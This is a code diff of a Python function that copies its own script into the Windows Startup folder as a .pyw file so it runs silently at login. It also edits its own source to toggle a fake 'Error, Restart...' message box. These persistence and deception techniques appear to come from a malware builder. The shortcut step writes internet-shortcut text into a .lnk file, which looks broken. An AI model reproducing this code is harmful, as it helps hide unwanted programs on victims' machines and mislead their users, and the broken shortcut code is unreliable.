@@ -37,14 +37,12 @@ def add_to_startup(py_file_path=file_path, bat_file_path=None):
     if not bat_file_path:
         bat_file_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
-    # Write Python version to startup folder
     py_file_name = os.path.basename(py_file_path)
     py_shortcut_path = os.path.join(bat_file_path, py_file_name[:-3] + "lnk")
     python_exe_path = os.path.join(os.path.dirname(os.__file__), 'pythonw.exe')
     with open(py_shortcut_path, 'w') as shortcut_file:
         shortcut_file.write(f'[InternetShortcut]\nURL=file://{py_file_path}\nIconFile={python_exe_path}\nIconIndex=0\n')
 
-    # Write batch file version to startup folder
     bat_file_name = os.path.basename(file_path[:-3] + ".pyw")
     bat_file_path = os.path.join(bat_file_path, bat_file_name)
     shutil.copy2(file_path, bat_file_path)
@@ -57,8 +55,11 @@ def add_to_startup(py_file_path=file_path, bat_file_path=None):
         f.write(contents)
 
     contents = contents.replace('if fakeerror == True:\n    ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)\nelse:pass', 'pass')
+    with open(bat_file_path, "w", encoding="utf-8") as f:
+        f.write(contents)
 
-# Write the updated contents back to the file
+    contents = contents.replace('if fakeerror == False:\n    ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)\nelse:pass', 'pass')
+
     with open(file_path, "w", encoding="utf-8") as f:
         f.write(contents)
 
